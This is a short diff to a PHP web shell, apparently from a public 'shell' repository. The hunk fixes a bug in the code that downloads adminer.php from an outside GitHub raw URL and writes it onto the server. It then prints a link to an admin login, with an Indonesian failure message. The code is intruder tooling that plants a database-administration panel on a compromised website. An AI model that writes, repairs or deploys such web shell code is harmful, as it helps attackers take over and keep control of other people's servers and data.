@@ -1319,7 +1319,7 @@ if($_GET['logout'] == true) {
 	if(file_exists('adminer.php')) {
 		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 	} else {
-		if(file_put_contents("adminer2.php", file_get_contents("https://raw.githubusercontent.com/xdavian/shell/main/adminer.php")); {
+		if(file_put_contents("adminer.php", getsource("https://raw.githubusercontent.com/xdavian/shell/main/adminer.php"))) {
 			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 		} else {
 			echo "<center><font color=red>gagal buat file adminer</font></center>";
